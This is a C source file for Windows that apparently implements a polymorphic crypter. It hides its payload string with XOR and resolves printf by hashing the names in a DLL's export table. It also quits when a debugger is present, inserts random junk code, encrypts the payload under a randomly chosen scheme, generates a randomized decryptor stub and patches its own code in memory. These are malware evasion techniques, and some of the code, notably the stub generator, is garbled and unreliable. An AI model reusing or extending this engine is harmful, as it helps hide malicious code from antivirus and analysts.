#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>
#include <stdint.h>

#define MAX_SIZE 1024
#define XOR_KEY 0xAA
#define API_HASH_SEED 0xDEADBEEF

typedef enum { 
    ENC_XOR, 
    ENC_ADD, 
    ENC_SUB, 
    ENC_ROT 
} EncMethod;

typedef struct {
    EncMethod method;
    uint8_t decrypt_opcode;
    uint8_t stub_register_mask;
} MethodConfig;

static const MethodConfig ENCRYPTED_METHODS[] = {
    {ENC_XOR, 0x32 ^ XOR_KEY, 0x40 ^ XOR_KEY},
    {ENC_ADD, 0x2A ^ XOR_KEY, 0x40 ^ XOR_KEY},
    {ENC_SUB, 0x2A ^ XOR_KEY, 0x40 ^ XOR_KEY},
    {ENC_ROT, 0xC0 ^ XOR_KEY, 0x40 ^ XOR_KEY},
};

typedef struct {
    void (*decoy1)(int);
    void (*real_printf)(const char *, ...);
    void (*decoy2)(void*);
    char dummy[16];
} ObfuscatedAPI;

ObfuscatedAPI api;

typedef struct {
    uint8_t part1[7];
    uint8_t part2[6];
    uint8_t xor_key;
} ObfuscatedPayload;

static const ObfuscatedPayload OBFS_PAYLOAD = {
    {0x53^XOR_KEY, 0x65^XOR_KEY, 0x63^XOR_KEY, 0x72^XOR_KEY, 0x65^XOR_KEY, 0x74^XOR_KEY, 0x50^XOR_KEY}, 
    {0x61^XOR_KEY, 0x79^XOR_KEY, 0x6C^XOR_KEY, 0x6F^XOR_KEY, 0x61^XOR_KEY, 0x64^XOR_KEY},
    XOR_KEY
};

uint32_t compute_hash(const char *str, uint32_t seed) {
    uint32_t hash = seed;
    while (*str) {
        hash = (hash ^ (*str)) + ((hash << 26) | (hash >> 6));
        str++;
    }
    return hash;
}

void garbage1() { __asm__("nop\n\tmov eax, eax\n\tadd ebx, 0"); }
void garbage2() { __asm__("xor ecx, ecx\n\tinc edx"); }
void garbage3() { __asm__("sub eax, eax\n\tor ebx, ebx"); }
void garbage4() { __asm__("lea eax, [eax+eax]\n\txor ebx, ecx"); }
void garbage5() { __asm__("imul edx, ebx, 3\n\tadd eax, edx"); }

void insert_garbage_blocks() {
    switch(rand() % 6) {
        case 0: garbage1(); break;
        case 1: garbage2(); break;
        case 2: garbage3(); break;
        case 3: garbage4(); break;
        case 4: garbage5(); break;
        case 5: 
            garbage1();
            garbage2();
            break;
    }
}

unsigned char random_byte() {
    return rand() % 256;
}

int is_debugger_present() {
    return IsDebuggerPresent();
}

void init_api_redirect() {
    HMODULE hModule = GetModuleHandle("msvcrt.dll");
    uint32_t seed = rand() ^ GetTickCount() ^ GetCurrentProcessId();
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)hModule + 
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD *names = (DWORD*)((DWORD_PTR)hModule + exportDir->AddressOfNames);
    WORD *ordinals = (WORD*)((DWORD_PTR)hModule + exportDir->AddressOfNameOrdinals);
    DWORD *functions = (DWORD*)((DWORD_PTR)hModule + exportDir->AddressOfFunctions);
    
    uint32_t target_hash = compute_hash("printf", seed);
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char *funcName = (char*)((DWORD_PTR)hModule + names[i]);
        if (compute_hash(funcName, seed) == target_hash) {
            api.real_printf = (void (*)(const char *, ...))((DWORD_PTR)hModule + functions[ordinals[i]]);
            break;
        }
    }
    
    if (!api.real_printf) exit(1);
    api.decoy1 = (void (*)(int))GetProcAddress(hModule, "exit");
    api.decoy2 = (void (*)(void*))GetProcAddress(hModule, "malloc");
}

void insert_garbage(unsigned char **stub, int count) {
    const uint8_t garbage[] = {0x90, 0x27, 0x37, 0x2E, 0x3E, 0x9B, 0xF8, 0xFC, 0xAA, 0xBB, 0xCC};
    for (int i = 0; i < count; i++) {
        if (rand() % 3 == 0) { 
            *(*stub)++ = garbage[rand() % (sizeof(garbage) / sizeof(garbage[0]))];
        } else {
            switch(rand() % 6) {
                case 0: 
                    *(*stub)++ = 0x40 + (rand() % 0x3F);
                    break;
                case 1: 
                    *(*stub)++ = 0x66; 
                    *(*stub)++ = 0x90; 
                    i++; 
                    break;
                case 2: 
                    *(*stub)++ = 0x0F; 
                    *(*stub)++ = 0x1F + (rand() % 4); 
                    i++;
                    break;
                case 3:
                    *(*stub)++ = 0x90 ^ (rand() % 0x100);
                    break;
                case 4:
                    *(*stub)++ = 0x90;
                    *(*stub)++ = 0x90;
                    i++;
                    break;
                case 5:
                    *(*stub)++ = 0xD3; 
                    *(*stub)++ = 0xC0 | (rand() % 8);
                    i++;
                    break;
            }
        }
    }
}

void self_modifying_wrapper(int (*func)()) {
    void *page = (void *)((uintptr_t)func & ~(uintptr_t)0xFFF);
    size_t len = 4096;
    DWORD old_protect;
    VirtualProtect(page, len, PAGE_EXECUTE_READWRITE, &old_protect);

    unsigned char *p = (unsigned char *)func;
    for (int i = 0; i < 4; i++) {
        p[i] = (rand() % 2) ? 0x90 : 0xCC;
    }

    VirtualProtect(page, len, PAGE_EXECUTE_READ, &old_protect);
}

void generate_stub(unsigned char *stub, size_t *size, EncMethod method, int payload_size) {
    unsigned char *p = stub;
    int addr_reg = rand() % 8;
    int use_jmp = rand() % 3;
    int code_variant = rand() % 3;

    MethodConfig config = {0};
    for (int i = 0; i < 4; i++) {
        if (ENCRYPTED_METHODS[i].method == method) {
            config.decrypt_opcode = ENCRYPTED_METHODS[i].decrypt_opcode ^ XOR_KEY;
            config.stub_register_mask = ENCRYPTED_METHODS[i].stub_register_mask ^ XOR_KEY;
            break;
        }
    }

    if (code_variant == 0) {
        insert_garbage(&p, rand() % 8); 
        *p++ = 0xB8 | (addr_reg & 0x7);
        *((uint64_t*)p) = (uint64_t)(p + 8 + rand() % 16);  
        p += 8;
    } else if (code_variant == 1) {
        *p++ = 0xE8; 
        *((int*)p) = rand() % 256; 
        p += 4;
        insert_garbage(&p, rand() % 4);
    } else {
        *p++ = 0xEB;
        *p++ = rand() % 256;
        insert_garbage(&p, rand() % 4);
    }

    *p++ = 0xC6 + (rand() % 2);
    *p++ = (rand() % 4) << 6; 
    *p++ = 0x90 ^ (rand() % 0x100);

    insert_garbage(&p, 2 + rand() % 6); 

    if (use_jmp == 0) {
        *p++ = 0xE2 + (rand() % 4); 
        *p++ = 0xF6 + (rand() % 8);
    } else if (use_jmp == 1) {
        *p++ = 0x75;
        *p++ = 0xEE + (rand() % 8);
    } else {
        *p++ = 0xEB;
        *p++ = rand() % 256;
    }

    uint8_t base_reg = (rand() % 4) << 3;
    *p++ = config.decrypt_opcode;
    *p++ = config.stub_register_mask | base_reg | (rand() % 2);

    if (rand() % 2) {
        *p++ = 0x83;
        *p++ = 0xC0 | (addr_reg << 3);
        *p++ = 0x02 + (rand() % 4);
    } else {
        *p++ = 0x05 + (rand() % 2);
        *((int*)p) = 2;
        p += 4;
    }

    insert_garbage(&p, rand() % 4);

    insert_garbage(&p, 2 + rand() % 8);

    *size = p - stub;
}

void polymorphic_encrypt(
    unsigned char *payload,
    size_t size,
    unsigned char *output,
    size_t *output_size,
    EncMethod method
) {
    *output_size = 0;
    for (size_t i = 0; i < size; i++) {
        volatile uint32_t dummy = (rand() ^ (uint32_t)i);
        dummy = dummy * 37 + 19; 
        unsigned char key = random_byte();
        switch(method) {
            case ENC_XOR: 
                output[(*output_size)++] = payload[i] ^ key; 
                break;
            case ENC_ADD: 
                output[(*output_size)++] = (payload[i] + key) % 256; 
                break;
            case ENC_SUB: 
                output[(*output_size)++] = (payload[i] - key) % 256; 
                break;
            case ENC_ROT: 
                output[(*output_size)++] = ((payload[i] << 1) | (payload[i] >> 7)) ^ key;
                break;
        }
        output[(*output_size)++] = key;
    }
}

void polymorphic_decrypt(
    unsigned char *encrypted,
    size_t encrypted_size,
    unsigned char *output,
    size_t *output_size,
    EncMethod method
) {
    *output_size = 0;
    for (size_t i = 0; i < encrypted_size; i += 2) {
        unsigned char enc_byte = encrypted[i];
        unsigned char key = encrypted[i + 1];
        
        switch(method) {
            case ENC_XOR:
                output[(*output_size)++] = enc_byte ^ key;
                break;
            case ENC_ADD:
                output[(*output_size)++] = (enc_byte - key + 256) % 256;
                break;
            case ENC_SUB:
                output[(*output_size)++] = (enc_byte + key) % 256;
                break;
            case ENC_ROT: {
                unsigned char temp = enc_byte ^ key;
                output[(*output_size)++] = (temp >> 1) | (temp << 7);
                break;
            }
        }
    }
}

int main() {
    LARGE_INTEGER perfCount;
    QueryPerformanceCounter(&perfCount);
    srand(time(NULL) ^ perfCount.LowPart ^ GetCurrentProcessId());
    insert_garbage_blocks();
    init_api_redirect();
    insert_garbage_blocks();

    if (is_debugger_present()) {
        api.real_printf("Debugger detected!\n");
        exit(1);
    }

    unsigned char payload[14];
    for (int i = 0; i < 7; i++) 
        payload[i] = OBFS_PAYLOAD.part1[i] ^ OBFS_PAYLOAD.xor_key;
    for (int i = 0; i < 6; i++) 
        payload[i + 7] = OBFS_PAYLOAD.part2[i] ^ OBFS_PAYLOAD.xor_key;
    payload[13] = 0; 

    size_t size = strlen((char*)payload);

    EncMethod method = rand() % 4;
    api.real_printf("Encryption Method: %d\n", method);

    unsigned char encrypted[MAX_SIZE];
    size_t enc_size;
    polymorphic_encrypt(payload, size, encrypted, &enc_size, method);

    api.real_printf("Encrypted Payload: ");
    for (size_t i = 0; i < enc_size; i++) {
        api.real_printf("%02X ", encrypted[i]);
    }
    api.real_printf("\n");

    unsigned char decrypted_soft[MAX_SIZE];
    size_t decrypted_soft_size;
    polymorphic_decrypt(encrypted, enc_size, decrypted_soft, &decrypted_soft_size, method);
    api.real_printf("Software Decryption: %s\n", decrypted_soft);

    unsigned char decryptor[MAX_SIZE];
    size_t stub_size;
    generate_stub(decryptor, &stub_size, method, size);

    api.real_printf("Decryptor Stub: ");
    for (size_t i = 0; i < stub_size; i++) {
        api.real_printf("%02X ", decryptor[i]);
    }
    api.real_printf("\n");

    self_modifying_wrapper(main);
    insert_garbage_blocks();

    return 0;
}
